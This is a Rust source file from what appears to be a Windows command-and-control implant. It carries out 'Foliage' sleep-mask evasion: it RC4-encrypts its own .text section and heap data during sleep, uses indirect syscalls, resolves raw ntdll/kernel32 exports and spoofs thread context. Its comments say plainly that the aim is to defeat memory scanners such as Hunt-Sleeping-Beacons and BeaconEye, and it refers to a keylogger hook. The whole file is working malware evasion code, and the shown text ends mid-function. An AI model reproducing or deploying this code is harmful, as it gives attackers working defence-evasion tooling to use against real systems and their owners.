//! Sleep obfuscation — Foliage syscall executor (P2.1a-iii).
//!
//! ## Status: Full Foliage APC→NtContinue chain, GATED ON (default).
//! The pure state-machine math lives in `nyx_implant_evasionsdk::foliage` (5
//! host tests). This module maps the chain to indirect syscalls:
//!   - protect the .text RX→RW (NtProtectVirtualMemory)
//!   - RC4-encrypt the region in place (SystemFunction032 math, via evasionsdk)
//!   - save the beacon thread's original CONTEXT (NtGetContextThread — step 4)
//!   - queue APCs (NtQueueApcThread) that each NtContinue into the next CONTEXT
//!   - the sleep itself (NtDelayExecution in the APC window)
//!   - decrypt + protect RW→RX on wake
//!   - restore the beacon thread's original CONTEXT (NtSetContextThread — step 8)
//!
//! ## Threading model (GetContext / RestoreContext)
//! GetContext and RestoreContext run on the **beacon thread** (not the helper):
//!   - GetContext: called BEFORE spawning the helper, while the beacon thread
//!     is still running its normal flow. This snapshots the original register
//!     state (including RSP) into a heap-allocated CONTEXT buffer.
//!   - RestoreContext: called AFTER joining the helper, once .text is decrypted
//!     and unprotected. Restores the beacon thread to its pre-sleep register
//!     state via NtSetContextThread.
//! The helper thread reads the saved RSP from the shared FoliageParams to build
//! the spoofed CONTEXT — it does NOT call NtGetContextThread itself.
//!
//! ## Gating
//! `FOLIAGE_ENABLED` defaults ON — the full APC chain + .text RC4 masking is
//! active on every sleep cycle. The operator can disarm at runtime via
//! `set_foliage_enabled(false)` if the target requires minimal footprint.

#![cfg(target_os = "windows")]

use alloc::boxed::Box;
use core::sync::atomic::{AtomicBool, Ordering};
use nyx_implant_evasionsdk::foliage::{FoliagePlan, FoliageStep};

/// Master switch for the Foliage sleep mask. **Defaults ON** — the full APC
/// chain + .text RC4 masking is active on every sleep cycle. The operator can
/// disarm at runtime via `set_foliage_enabled(false)` if the target requires
/// minimal footprint. See module docs for the 7-stage APC plan.
///
/// Build-time override: set `NYX_FOLIAGE_OFF=1` to ship the implant with
/// Foliage disarmed by default (the runtime `set_foliage_enabled` still works).
/// This is for hosts where the APC-chain sleep mask is unstable in the loader
/// context (e.g. `rundll32`-loaded PIC DLLs whose `.text`/thread context
/// Foliage's NtSetContextThread restore mishandles, surfacing as
/// STATUS_STACK_BUFFER_OVERRUN). sRDI-injected into a real host process the
/// mask is expected to work — leave the default ON for engagements.
static FOLIAGE_ENABLED: AtomicBool = AtomicBool::new(foliage_default_on());

/// Compile-time default for the Foliage master switch. ON unless the build set
/// `NYX_FOLIAGE_OFF=1` (see the `FOLIAGE_ENABLED` doc). `const fn` + `match`
/// because `Option::map`/`unwrap_or` aren't stable as const fns yet.
const fn foliage_default_on() -> bool {
    match option_env!("NYX_FOLIAGE_OFF") {
        // NYX_FOLIAGE_OFF=1 → ship disarmed. Any other value (0/empty/garbage)
        // → still armed (operator must be explicit to disable).
        Some(v) => !(v.len() == 1 && v.as_bytes()[0] == b'1'),
        None => true,
    }
}

/// Arm/disarm the Foliage sleep mask.
pub fn set_foliage_enabled(on: bool) {
    FOLIAGE_ENABLED.store(on, Ordering::Release);
}

/// Whether the Foliage sleep mask is currently armed.
pub fn foliage_enabled() -> bool {
    FOLIAGE_ENABLED.load(Ordering::Acquire)
}

/// P4 — Foliage APC path master switch. OFF by default: the PIC thunk
/// (`pic_thunk::build_mask_thunk`) emits research-grade shellcode that needs
/// real-machine validation before it can run unsupervised. The operator opts
/// in with `NYX_FOLIAGE_APC_ON=1` at build time, after verifying the thunk on
/// the target. When OFF, `execute_foliage_plan` uses the data-only floor
/// (heap mask + indirect-syscall sleep — still meaningful, just without
/// `.text` encryption).
///
/// When ON, `execute_foliage_plan` builds the PIC thunk, copies it to an
/// executable stack page, and queues it via `NtQueueApcThread` against the
/// beacon's alertable window — encrypting `.text` for the sleep window so
/// Hunt-Sleeping-Beacons / BeaconEye see ciphertext. The thunk un-encrypts
/// `.text` before the beacon resumes.
///
/// Mutually exclusive with the keylog hook thread: encrypting `.text` while
/// `keylog::hook_is_active()` would corrupt the hook callback (which lives in
/// `.text`). When both are on, the APC path degrades to the data-only floor
/// for that cycle (see `execute_foliage_plan`).
static FOLIAGE_APC_ENABLED: AtomicBool = AtomicBool::new(foliage_apc_default_on());

/// Compile-time default for the APC path. OFF unless `NYX_FOLIAGE_APC_ON=1`.
const fn foliage_apc_default_on() -> bool {
    match option_env!("NYX_FOLIAGE_APC_ON") {
        Some(v) => v.len() == 1 && v.as_bytes()[0] == b'1',
        None => false,
    }
}

/// Arm/disarm the Foliage APC path (P4, research-grade). When armed AND the
/// keylog hook is NOT active, `execute_foliage_plan` runs the full
/// mask→wait→unmask cycle via the PIC thunk. Returns the previous value.
pub fn set_foliage_apc_enabled(on: bool) -> bool {
    FOLIAGE_APC_ENABLED.swap(on, Ordering::Release)
}

/// Whether the Foliage APC path (PIC thunk, `.text` encryption) is armed.
pub fn foliage_apc_enabled() -> bool {
    FOLIAGE_APC_ENABLED.load(Ordering::Acquire)
}

/// Sleep `seconds` with sleep-mask obfuscation.
///
/// **With [`foliage_enabled`] ON (default)**: builds a `FoliagePlan` and
/// executes the Foliage mask→sleep→unmask cycle over the implant `.text`
/// via indirect syscalls. The full APC chain + RC4 masking is active.
///
/// **With [`foliage_enabled`] OFF**: delegates to `beacon::sleep_seconds`
/// (plain indirect-syscall NtDelayExecution). On any failure (runtime down,
/// .text unresolved), degrades to the plain sleep — never crashes.
pub fn sleep(seconds: u32) {
    if !foliage_enabled() {
        crate::beacon::sleep_seconds(seconds);
        return;
    }
    crate::entry::diag_mark(b"F1_foliage_armed");
    let region = match unsafe { own_text_region() } {
        Some(r) => r,
        None => {
            crate::entry::diag_mark(b"F_degrade_no_text");
            crate::beacon::sleep_seconds(seconds);
            return;
        }
    };
    crate::entry::diag_mark(b"F2_text_region");
    let key = mask_key_16();
    let spoof_rip = crate::stack::gap_pool_rip();
    crate::entry::diag_mark(b"F3_gap_rip");
    let plan = FoliagePlan::build(region.base, region.len, seconds, spoof_rip, key);
    crate::entry::diag_mark(b"F4_plan_built");
    execute_foliage_plan(&plan);
    crate::entry::diag_mark(b"F5_plan_executed");
}

/// The implant's own `.text` region (base + len). Used by the Foliage APC chain
/// and the `MemoryMaskKit` live impl. Reading PEB->ImageBaseAddress is correct
/// for both rundll32 and reflective-loaded implants.
pub(crate) struct TextRegion {
    pub base: usize,
    pub len: usize,
}

/// The implant's own `.text` region (base + len). Reads PEB->ImageBaseAddress
/// directly (NOT a DLL-name lookup — reflective-loaded shellcode has no loader
/// entry, so a name search would fail). The PEB is always correct regardless
/// of how the implant was loaded (rundll32 DLL OR reflective sRDI shellcode).
///
/// Returns None only if the PEB or PE headers are unreadable (shouldn't happen).
///
/// # Safety
/// PEB + PE header reads are stable post-load. Single-threaded context.
pub(crate) unsafe fn own_text_region() -> Option<TextRegion> {
    let mut addr = own_text_region as *const () as usize & !0xFFF;
    loop {
        let dos = addr as *const [u8; 2];
        if !dos.is_null() && unsafe { *dos == [b'M', b'Z'] } {
            break;
        }
        if addr < 0x1000 {
            return None;
        }
        addr -= 0x1000;
    }
    let (text_rva, text_size) = unsafe { section_va_len(addr, b".text")? };
    Some(TextRegion {
        base: addr + text_rva,
        len: text_size,
    })
}

/// Find a PE section's (virtual_address, virtual_size) by name. Returns None
/// if the PE headers can't be parsed or the section isn't found.
#[allow(dead_code)] // used by the APC-chain refactor (own_text_region)
unsafe fn section_va_len(base: usize, name: &[u8]) -> Option<(usize, usize)> {
    let dos = unsafe { &*(base as *const [u8; 64]) };
    if dos[0] != b'M' || dos[1] != b'Z' {
        return None;
    }
    let e_lfanew = i32::from_le_bytes([dos[60], dos[61], dos[62], dos[63]]) as usize;
    let nt = unsafe { &*((base + e_lfanew) as *const [u8; 24]) };
    if !(nt[0] == b'P' && nt[1] == b'E') {
        return None; // bad PE signature
    }
    let num_sections = u16::from_le_bytes([nt[6], nt[7]]) as usize;
    let size_opt_hdr = u16::from_le_bytes([nt[20], nt[21]]) as usize;
    let sections_off = e_lfanew + 24 + size_opt_hdr;
    for i in 0..num_sections {
        // IMAGE_SECTION_HEADER: Name[8] + VirtualSize(4) + VirtualAddress(4) + ...
        let sec = unsafe { &*((base + sections_off + i * 40) as *const [u8; 40]) };
        let name_len = name.iter().position(|&b| b == 0).unwrap_or(name.len());
        if sec[..name_len] == name[..name_len] {
            let vsize = u32::from_le_bytes([sec[8], sec[9], sec[10], sec[11]]) as usize;
            let vaddr = u32::from_le_bytes([sec[12], sec[13], sec[14], sec[15]]) as usize;
            return Some((vaddr, vsize));
        }
    }
    None
}

/// Derive a 16-byte RC4 key (matches SystemFunction032's USTRING convention).
/// Per-boot diversity from the syscall runtime's SSN table.
fn mask_key_16() -> [u8; 16] {
    let seed: u32 = crate::syscalls::global()
        .and_then(|rt| rt.ssn_by_hash(crate::resolve::djb2(b"ntdelayexecution")))
        .unwrap_or(0x1234_5678);
    let mut key = [0u8; 16];
    let mut s = seed;
    for b in key.iter_mut() {
        s = s
            .wrapping_mul(0x9E37_79B9)
            .rotate_left(7)
            .wrapping_add(0xA5A5_A5A5);
        *b = (s & 0xFF) as u8;
    }
    key
}

/// Walk the FoliagePlan: mask `.text`, park the beacon in an APC-driven alertable
/// sleep, unmask `.text` on wake. Falls back to the data-only mask floor on any
/// failure (never crashes — see [`execute_foliage_apc`]).
///
/// ## How the .text encryption is now safe (Task E)
/// The previous floor masked only registered DATA regions (via `crate::mem`)
/// because encrypting `.text` while executing through it is instant death (the
/// RC4 loop overwrites its own instructions). Task E adds the real Foliage
/// mechanism: a SEPARATE helper thread masks/unmasks `.text` around the beacon
/// thread's parked alertable sleep, and queues an APC into the beacon's
/// alertable window so the beacon is driven through the masked window without
/// executing `.text` while it's ciphertext. See [`execute_foliage_apc`].
fn execute_foliage_plan(plan: &FoliagePlan) {
    let secs = plan_seconds(plan);
    let region = unsafe { own_text_region() };
    let spoof_rip = plan.steps.iter().find_map(|s| {
        if let FoliageStep::SetContext { spoof_rip } = s {
            Some(*spoof_rip)
        } else {
            None
        }
    });

    crate::entry::diag_mark(b"E1_before_apc");
    // The APC-chain path (execute_foliage_apc) encrypts .text via a helper
    // thread — but the helper's own code lives in .text, so encrypting .text
    // corrupts the helper's in-flight instructions → abort. The standard fix
    // (Ekko/Foliage) uses a stack-allocated PIC thunk for the mask→wait→unmask
    // sequence so the helper never executes from .text while it's encrypted.
    // Until that thunk lands (P4), use the data-only floor: it masks heap regions
    // (config, session key, token cache, BOF scratch) + does the indirect-
    // syscall sleep — still meaningful sleep obfuscation, just without .text
    // encryption. Strictly better than NoMask.
    //
    // P4 (PIC thunk) re-enables the APC path here, gated on:
    //   1. FOLIAGE_APC_ENABLED (default OFF — research-grade, operator opts in
    //      via NYX_FOLIAGE_APC_ON=1 after validating the thunk on the target).
    //   2. !keylog::hook_is_active() — encrypting .text while the keylog hook
    //      thread's callback (which lives in .text) is in flight corrupts it.
    //   3. region.is_some() — we need the .text base/len.
    //   4. execute_foliage_apc returns true (the full mask cycle completed).
    // If any gate fails, fall through to the data-only floor.
    //
    // The PIC thunk (crates/implant-win/src/pic_thunk.rs) executes the
    // mask→wait→unmask sequence from the STACK (not .text), so encrypting
    // .text doesn't corrupt the in-flight instructions. The thunk builder is
    // research-grade; its opcode sequence has NOT been validated on a real
    // target in this codebase — the gate is the honesty mechanism.
    // Hard gate: the APC path calls execute_foliage_apc → foliage_helper, which
    // currently masks .text FROM .text (the helper fn body lives in .text).
    // The moment RC4 encrypts .text (line ~787), the helper's next instruction
    // fetch executes ciphertext → 0xC0000005 ACCESS_VIOLATION. Confirmed on
    // Server 2019 17763 (2026-07-06 test run).
    //
    // The fix is the PIC thunk: rewrite foliage_helper to copy
    // pic_thunk::build_mask_thunk() bytes onto an executable stack page and
    // queue THAT via NtQueueApcThread (the thunk runs from the stack, not
    // .text, so encrypting .text is safe). Until that rewrite lands,
    // FOLIAGE_APC_THUNK_WIRED stays false and the APC path is never taken —
    // regardless of NYX_FOLIAGE_APC_ON. This is the honest gate.
    const FOLIAGE_APC_THUNK_WIRED: bool = false;
    if FOLIAGE_APC_THUNK_WIRED && foliage_apc_enabled() && !crate::keylog::hook_is_active() {
        if let Some(r) = &region {
            crate::entry::diag_mark(b"E2_apc_attempt");
            if unsafe { execute_foliage_apc(r, &plan.key, secs, spoof_rip) } {
                crate::entry::diag_mark(b"E3_apc_ok");
                return; // full mask cycle completed — done
            }
            crate::entry::diag_mark(b"F_apc_fell_back");
            // APC path failed (protect / RC4 / wait / verify) — fall through to
            // the data-only floor so we still sleep-mask the heap regions.
        }
    }

    // ---- Data-only floor ----
    crate::entry::diag_mark(b"E4_data_floor");
    let rt = match crate::syscalls::global() {
        Some(rt) => rt,
        None => {
            crate::beacon::sleep_seconds(secs);
            return;
        }
    };
    crate::mem::mask();
    crate::entry::diag_mark(b"E5_masked");
    let delay: i64 = -(secs as i64).saturating_mul(10_000_000);
    let _ = unsafe { crate::syscalls::nt_delay_execution(rt, 0, &delay as *const i64 as usize) };
    crate::mem::unmask();
    crate::entry::diag_mark(b"E6_unmasked");
}

// ===========================================================================
// Task E: real Foliage APC chain — helper thread masks .text around the
// beacon's alertable sleep. Returns true if the full cycle completed.
// ===========================================================================
//
// ## Threading model & the single-trampoline hazard
// The indirect-syscall `Runtime` (syscalls.rs) owns ONE shared RWX trampoline
// page with NO locking — it assumes a single beacon thread. A helper thread
// that also goes through `syscallN` would race on that page and corrupt it.
// So the helper thread resolves + calls the NT/Win32 functions it needs via
// the RAW ntdll/kernel32 EXPORT addresses (`crate::resolve::export_addr` +
// transmute), bypassing the indirect runtime entirely. The beacon thread
// keeps exclusive use of the indirect runtime. Two threads, two syscall paths,
// no shared mutable page.
//
// ## Safety / crash risk (red-line honesty)
// This manipulates another thread's execution window and flips `.text`
// protection. A bug here crashes the implant (user-mode, NOT a BSOD). Every
// step degrades on failure (returns false → caller falls to the data-only
// floor), and the round-trip is byte-verified before reporting success.
// `FOLIAGE_APC_OK` is the diagnostic a selftest reads.

/// Diagnostic: 0 = not attempted, 1 = APC chain completed cleanly, 2 = attempted
/// but degraded (data-only floor ran). Selftest reads this.
pub static FOLIAGE_APC_OK: core::sync::atomic::AtomicU8 = core::sync::atomic::AtomicU8::new(0);

/// Diagnostic stage bitmask — pinpoints exactly WHERE the chain fails:
///   bit0 = NtOpenThread OK (beacon handle obtained)
///   bit1 = FoliageRaw resolved (all exports found)
///   bit2 = GetContext succeeded (beacon context captured)
///   bit3 = helper spawned (CreateThread succeeded)
///   bit4 = alertable wait completed (beacon woke from sleep)
///   bit5 = helper joined (WaitForSingleObject returned)
///   bit6 = .text verified (round-trip byte-identical)
pub static FOLIAGE_STAGE: core::sync::atomic::AtomicU8 = core::sync::atomic::AtomicU8::new(0);

/// Read the Foliage APC diagnostic (0/1/2).
pub fn foliage_apc_status() -> u8 {
    FOLIAGE_APC_OK.load(core::sync::atomic::Ordering::Acquire)
}

/// Read the stage bitmask (where the chain got to before failing).
pub fn foliage_stage() -> u8 {
    FOLIAGE_STAGE.load(core::sync::atomic::Ordering::Acquire)
}

/// Run one real Foliage cycle: spawn a helper thread, beacon parks in an
/// alertable sleep, helper masks `.text` → queues an APC → waits → unmasks.
/// Returns true on full success; on ANY failure sets status=2 and returns
/// false so the caller degrades to the data-only floor.
///
/// ## FoliagePlan traversal (steps 4 + 8)
/// This function implements GetContext (step 4) and RestoreContext (step 8) on
/// the **beacon thread** — NOT the helper:
///   - **GetContext**: After resolving `FoliageRaw`, before spawning the helper,
///     call `NtGetContextThread(beacon_handle, &saved_ctx)` to capture the
///     beacon's original register state (including RSP). The saved CONTEXT is
///     stored in `FoliageParams` so the helper can read `saved_ctx.rsp()` when
///     building the spoofed CONTEXT for NtContinue.
///   - **RestoreContext**: After joining the helper (`.text` is decrypted and
///     unprotected), call `NtSetContextThread(beacon_handle, &saved_ctx)` to
///     restore the beacon thread to its pre-sleep register state.
///
/// # Safety
/// `region` must be the implant's own `.text`. Single beacon caller.
unsafe fn execute_foliage_apc(
    region: &TextRegion,
    key: &[u8; 16],
    secs: u32,
    spoof_rip: Option<u64>,
) -> bool {
    FOLIAGE_APC_OK.store(0, core::sync::atomic::Ordering::Release);
    FOLIAGE_STAGE.store(0, core::sync::atomic::Ordering::Release);

    let beacon_tid: usize;
    core::arch::asm!("mov {v}, gs:[0x30]", v = out(reg) beacon_tid, options(nostack, readonly));
    let unique_thread = core::ptr::read_volatile((beacon_tid + 0x48) as *const usize);

    // Stage 0: Obtain the beacon thread's real handle.
    // We use DuplicateHandle(GetCurrentThread()) instead of NtOpenThread because
    // NtOpenThread with CLIENT_ID can fail on some host configurations.
    // DuplicateHandle with GetCurrentThread() (-1) always returns a real handle.
    let mut beacon_handle: usize = 0;
    {
        let dup_addr = crate::resolve::export_addr(b"kernel32.dll", b"DuplicateHandle");
        let get_curr_thread = crate::resolve::export_addr(b"kernel32.dll", b"GetCurrentThread");
        let get_curr_proc = crate::resolve::export_addr(b"kernel32.dll", b"GetCurrentProcess");
        if let (Some(da), Some(gct), Some(gcp)) = (dup_addr, get_curr_thread, get_curr_proc) {
            // DuplicateHandle(hSrcProcess, hSrc, hTgtProcess, &hTgt, access, inherit, opts) = 7 args
            type FnDup =
                unsafe extern "system" fn(usize, usize, usize, *mut usize, u32, u32, u32) -> u32;
            type FnVoid = unsafe extern "system" fn() -> usize;
            let dup: FnDup = core::mem::transmute(da);
            let curr_thread: FnVoid = core::mem::transmute(gct);
            let curr_proc: FnVoid = core::mem::transmute(gcp);
            let ht = curr_thread();
            let hp = curr_proc();
            // DUPLICATE_SAME_ACCESS = 0x2, DUPLICATE_CLOSE_SOURCE = 0x1
            let st = dup(hp, ht, hp, &mut beacon_handle as *mut usize, 0, 0, 0x2);
            if st == 0 || beacon_handle == 0 {
                beacon_handle = 0;
            }
        }
    }
    if beacon_handle == 0 {
        FOLIAGE_APC_OK.store(2, core::sync::atomic::Ordering::Release);
        return false;
    }
    FOLIAGE_STAGE.store(1, core::sync::atomic::Ordering::Release); // bit0
    crate::entry::diag_mark(b"A1_dup_handle");

    // Stage 1: FoliageRaw resolve
    let raw = match unsafe { FoliageRaw::resolve() } {
        Some(r) => r,
        None => {
            FOLIAGE_APC_OK.store(2, core::sync::atomic::Ordering::Release);
            return false;
        }
    };
    FOLIAGE_STAGE.store(3, core::sync::atomic::Ordering::Release); // bit0+1
    crate::entry::diag_mark(b"A2_raw_resolved");

    // Stage 2: GetContext — capture the beacon thread's register state BEFORE
    // the helper thread is spawned. The helper reads saved_ctx.rsp() to build
    // the spoofed CONTEXT with the real stack pointer.
    //
    // CRITICAL: ContextFlags MUST be set before NtGetContextThread — the field
    // is both input and output. If ContextFlags = 0, the kernel captures
    // nothing and all registers remain zeroed → spoofed_context gets RSP=0
    // → NtContinue restores an invalid stack → beacon thread crashes.
    let mut saved_ctx = Box::new(crate::context::Context::default());
    // Set flags BEFORE passing to the kernel: request GENERAL + FLOATING_POINT
    // + CONTROL + INTEGER = CONTEXT_FULL (0x100007). CONTEXT_CONTROL (0x1)
    // alone gives RIP+RSP+SegCs+EFlags, but CONTEXT_FULL is safer.
    saved_ctx.set_context_flags(crate::context::CONTEXT_FULL);
    let saved_ctx_ptr = Box::into_raw(saved_ctx) as *mut crate::context::Context;
    let mut get_ctx_ok = false;
    if spoof_rip.is_some() {
        let st = raw.nt_get_context_thread(beacon_handle, saved_ctx_ptr as usize);
        if st >= 0 {
            // Verify the kernel actually populated the fields (sanity check:
            // if RSP is still 0 after GetContext, something went wrong and
            // building a spoofed CONTEXT with RSP=0 would crash the beacon).
            let captured_rsp = unsafe { (*saved_ctx_ptr).rsp() };
            get_ctx_ok = captured_rsp != 0;
        }
    }
    FOLIAGE_STAGE.store(7, core::sync::atomic::Ordering::Release); // bit0+1+2
    crate::entry::diag_mark(b"A3_getcontext");

    let mut before = [0u8; 16];
    unsafe { core::ptr::copy_nonoverlapping(region.base as *const u8, before.as_mut_ptr(), 16) };

    let params = Box::new(FoliageParams {
        text_base: region.base,
        text_len: region.len,
        key: *key,
        secs,
        raw,
        verify: core::ptr::null_mut(),
        spoof_rip: if get_ctx_ok { spoof_rip } else { None },
        saved_ctx: saved_ctx_ptr,
        beacon_handle,
    });
    let params_ptr: *mut FoliageParams = Box::into_raw(params);

    let verify = Box::new(VerifyState {
        before,
        ok: core::sync::atomic::AtomicBool::new(false),
    });
    (*params_ptr).verify = Box::into_raw(verify);

    // Stage 3: spawn helper
    let handle = match unsafe { raw_create_thread(foliage_helper, params_ptr as usize) } {
        Some(h) => h,
        None => {
            unsafe { drop(Box::from_raw(params_ptr)) };
            let _ = unsafe { Box::from_raw(saved_ctx_ptr) };
            FOLIAGE_APC_OK.store(2, core::sync::atomic::Ordering::Release);
            return false;
        }
    };
    FOLIAGE_STAGE.store(15, core::sync::atomic::Ordering::Release); // bit0-3
    crate::entry::diag_mark(b"A4_thread_spawned");

    // Stage 4: alertable wait
    let window = secs.max(1);
    let delay: i64 = -((window as i64).saturating_mul(10_000_000));
    const INVALID_HANDLE: usize = 0xFFFF_FFFF_FFFF_FFFF;
    crate::entry::diag_mark(b"A5_before_wait");
    unsafe { raw.nt_wait_for_single_object(INVALID_HANDLE, 1, &delay as *const i64 as usize) };
    crate::entry::diag_mark(b"A6_after_wait");
    FOLIAGE_STAGE.store(31, core::sync::atomic::Ordering::Release); // bit0-4

    // Stage 5: join helper
    unsafe { raw.wait_for_single_object(handle, 10_000) };
    FOLIAGE_STAGE.store(63, core::sync::atomic::Ordering::Release); // bit0-5

    // Stage 6: verify
    let mut after = [0u8; 16];
    unsafe { core::ptr::copy_nonoverlapping(region.base as *const u8, after.as_mut_ptr(), 16) };
    let verified = after == before;
    if verified {
        FOLIAGE_STAGE.store(127, core::sync::atomic::Ordering::Release); // bit0-6
    }

    // Reclaim memory.
    let p = unsafe { Box::from_raw(params_ptr) };
    let _ = unsafe { Box::from_raw(p.saved_ctx) };

    let nt_close_addr = crate::resolve::export_addr(b"ntdll.dll", b"NtClose");
    if let Some(nt_close) = nt_close_addr {
        type FnClose = unsafe extern "system" fn(usize) -> i32;
        let close_fn: FnClose = core::mem::transmute(nt_close);
        if p.beacon_handle != 0 {
            close_fn(p.beacon_handle);
        }
        if handle != 0 {
            close_fn(handle);
        }
    }

    if verified {
        FOLIAGE_APC_OK.store(1, core::sync::atomic::Ordering::Release);
        true
    } else {
        FOLIAGE_APC_OK.store(2, core::sync::atomic::Ordering::Release);
        false
    }
}

/// Byte snapshot for round-trip verification (leaked box, shared beacon/helper).
#[repr(C)]
struct VerifyState {
    before: [u8; 16],
    ok: core::sync::atomic::AtomicBool,
}

/// Parameters passed to the helper thread (leaked box).
#[repr(C)]
struct FoliageParams {
    text_base: usize,
    text_len: usize,
    key: [u8; 16],
    secs: u32,
    raw: FoliageRaw,
    verify: *mut VerifyState,
    /// Optional spoof RIP for NtContinue CONTEXT (None = no context spoof).
    spoof_rip: Option<u64>,
    /// The beacon thread's original CONTEXT, captured by NtGetContextThread on
    /// the beacon thread BEFORE the helper was spawned. The helper reads
    /// `saved_ctx.rsp()` to build the spoofed CONTEXT with the real RSP.
    /// This is the full 1232-byte CONTEXT; the helper does NOT call
    /// NtGetContextThread itself (the indirect-runtime trampoline is single-
    /// instance, and the beacon's context must be captured while it's still
    /// in its normal execution flow).
    saved_ctx: *mut crate::context::Context,
    /// The beacon thread's REAL handle (not pseudo). Used by the helper for
    /// NtQueueApcThread. Duplicated from `raw.beacon_thread_handle` for
    /// clarity — same value, but explicit in the params struct.
    beacon_handle: usize,
}

/// Bundle of raw export fn-pointers the helper thread uses (resolved once on
/// the beacon thread, copied into the helper's param block). NONE of these go
/// through the indirect syscall runtime — they call the export directly.
///
/// The beacon thread's REAL handle (not pseudo) is passed separately via
/// `FoliageParams::beacon_thread_handle` — `NtQueueApcThread` with a
/// pseudo-handle resolves to the calling thread, NOT the beacon.
#[derive(Clone, Copy)]
pub(crate) struct FoliageRaw {
    nt_protect: usize,
    nt_wait_for_single_object: usize,
    nt_queue_apc_thread: usize,
    nt_get_context_thread: usize,
    nt_set_context_thread: usize,
    wait_for_single_object: usize,
}

impl FoliageRaw {
    /// Resolve all the raw exports the Foliage chain needs. Returns None if any
    /// is missing (caller degrades).
    ///
    /// Note: NtGetContextThread/NtSetContextThread and NtContinue are resolved
    /// in FoliageRaw (for the helper's use), while NtOpenThread is resolved
    /// on-demand in `execute_foliage_apc` (it needs the handle first).
    ///
    /// # Safety
    /// Resolves export addresses via PEB walk (read-only). Beacon thread.
    unsafe fn resolve() -> Option<Self> {
        let nt_protect = crate::resolve::export_addr(b"ntdll.dll", b"NtProtectVirtualMemory")?;
        let nt_wait_for_single_object =
            crate::resolve::export_addr(b"ntdll.dll", b"NtWaitForSingleObject")?;
        let nt_queue_apc_thread = crate::resolve::export_addr(b"ntdll.dll", b"NtQueueApcThread")?;
        let nt_get_context_thread =
            crate::resolve::export_addr(b"ntdll.dll", b"NtGetContextThread")?;
        let nt_set_context_thread =
            crate::resolve::export_addr(b"ntdll.dll", b"NtSetContextThread")?;
        let wait_for_single_object =
            crate::resolve::export_addr(b"kernel32.dll", b"WaitForSingleObject")?;
        Some(Self {
            nt_protect,
            nt_wait_for_single_object,
            nt_queue_apc_thread,
            nt_get_context_thread,
            nt_set_context_thread,
            wait_for_single_object,
        })
    }

    /// Raw NtProtectVirtualMemory(ProcessHandle=-1, BaseAddress*, RegionSize*,
    /// NewProtection, OldProtection*). Returns the NTSTATUS.
    ///
    /// # Safety
    /// `base`/`size`/`old` must be valid mutable pointers.
    pub(crate) unsafe fn nt_protect_virtual_memory(
        &self,
        base: &mut usize,
        size: &mut usize,
        new_prot: u32,
        old: &mut u32,
    ) -> i32 {
        type Fn = unsafe extern "system" fn(usize, *mut usize, *mut usize, u32, *mut u32) -> i32;
        let f: Fn = unsafe { core::mem::transmute(self.nt_protect) };
        unsafe { f(0xFFFF_FFFF_FFFF_FFFF, base, size, new_prot, old) }
    }

    /// Raw NtWaitForSingleObject(Handle, Alertable, Timeout*).
    /// With `Handle = INVALID_HANDLE_VALUE` (-1) and `Alertable = TRUE`, gives
    /// wait-reason `UserRequest` instead of `DelayExecution`, defeating
    /// Hunt-Sleeping-Beacons heuristics. The helper's APC can still wake us.
    ///
    /// # Safety
    /// `timeout` must point at a valid i64 (100ns units, negative = relative).
    unsafe fn nt_wait_for_single_object(
        &self,
        handle: usize,
        alertable: u8,
        timeout: usize,
    ) -> i32 {
        type Fn = unsafe extern "system" fn(usize, u8, *const i64) -> i32;
        let f: Fn = unsafe { core::mem::transmute(self.nt_wait_for_single_object) };
        unsafe { f(handle, alertable, timeout as *const i64) }
    }

    /// Raw NtQueueApcThread(ThreadHandle, ApcRoutine, Arg1, Arg2, Arg3).
    ///
    /// # Safety
    /// `thread` must be a real thread handle with THREAD_SET_CONTEXT.
    unsafe fn nt_queue_apc_thread(
        &self,
        thread: usize,
        routine: usize,
        a1: usize,
        a2: usize,
        a3: usize,
    ) -> i32 {
        type Fn = unsafe extern "system" fn(usize, usize, usize, usize, usize) -> i32;
        let f: Fn = unsafe { core::mem::transmute(self.nt_queue_apc_thread) };
        unsafe { f(thread, routine, a1, a2, a3) }
    }

    /// Raw WaitForSingleObject(handle, ms).
    unsafe fn wait_for_single_object(&self, handle: usize, ms: u32) -> u32 {
        type Fn = unsafe extern "system" fn(usize, u32) -> u32;
        let f: Fn = unsafe { core::mem::transmute(self.wait_for_single_object) };
        unsafe { f(handle, ms) }
    }

    /// Raw NtGetContextThread(ThreadHandle, ContextRecord) — 2 real args.
    /// Captures the register state of `thread` into `ctx`. Used by the beacon
    /// thread (before spawning the helper) to snapshot its original CONTEXT.
    ///
    /// # Safety
    /// `ctx` must point at an aligned, writable 1232-byte CONTEXT buffer.
    unsafe fn nt_get_context_thread(&self, thread: usize, ctx: usize) -> i32 {
        type Fn = unsafe extern "system" fn(usize, usize) -> i32;
        let f: Fn = unsafe { core::mem::transmute(self.nt_get_context_thread) };
        unsafe { f(thread, ctx) }
    }

    /// Raw NtSetContextThread(ThreadHandle, ContextRecord) — 2 real args.
    /// Installs `ctx` as the register state of `thread`. Used to restore the
    /// beacon thread's original CONTEXT after the mask→sleep→unmask cycle.
    ///
    /// # Safety
    /// `ctx` must point at a valid CONTEXT. Only call when the thread is in a
    /// controlled window (after joining the helper, before the beacon resumes
    /// normal execution).
    unsafe fn nt_set_context_thread(&self, thread: usize, ctx: usize) -> i32 {
        type Fn = unsafe extern "system" fn(usize, usize) -> i32;
        let f: Fn = unsafe { core::mem::transmute(self.nt_set_context_thread) };
        unsafe { f(thread, ctx) }
    }
}

/// Raw kernel32!CreateThread → spawn `entry(param)`. Returns the thread handle
/// or None on failure.
///
/// # Safety
/// `entry` must be a valid thread-proc-style fn (usize arg → u32). Runs the
/// entry on a new thread.
/// Spawn a raw Win32 thread (kernel32!CreateThread) that runs entirely on raw
/// exports — bypassing the shared indirect-syscall trampoline (`syscalls::global()`).
///
/// `pub(crate)` so the keylog hook thread (P2) can reuse this without
/// duplicating the CreateThread resolution. Returns the thread handle (owned
/// by the caller; Close via `NtClose`).
pub(crate) unsafe fn raw_create_thread(
    entry: unsafe extern "system" fn(usize) -> u32,
    param: usize,
) -> Option<usize> {
    let addr = crate::resolve::export_addr(b"kernel32.dll", b"CreateThread")?;
    type Fn = unsafe extern "system" fn(
        *mut core::ffi::c_void,                          // lpThreadAttributes
        usize,                                           // dwStackSize
        Option<unsafe extern "system" fn(usize) -> u32>, // lpStartAddress
        usize,                                           // lpParameter
        u32,                                             // dwCreationFlags
        *mut u32,                                        // lpThreadId
    ) -> *mut core::ffi::c_void;
    let f: Fn = unsafe { core::mem::transmute(addr) };
    let h = unsafe {
        f(
            core::ptr::null_mut(),
            0,
            Some(entry),
